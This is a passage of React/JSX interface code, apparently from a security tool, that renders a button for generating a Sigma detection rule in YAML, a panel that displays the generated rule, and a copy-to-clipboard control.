                  className="w-full py-2 bg-white text-black font-semibold rounded-lg hover:bg-neutral-200 transition flex items-center justify-center gap-1.5"
                >
                  <FileCode className="w-3.5 h-3.5" />
                  Synthesize Sigma YAML
                </button>
              </div>

              {generatedSigma && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-white">Generated Sigma Specification</span>
                    <button
                      onClick={() => copyToClipboard(generatedSigma, "sigma-res")}
                      className="flex items-center gap-1 text-[11px] text-neutral-400 hover:text-white"
                    >
                      {copiedId === "sigma-res" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      Copy YAML
                    </button>
                  </div>
                  <pre className="p-3 bg-black border border-[#262626] rounded-lg font-mono text-[11px] text-neutral-200 overflow-x-auto whitespace-pre">
                    {generatedSigma}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
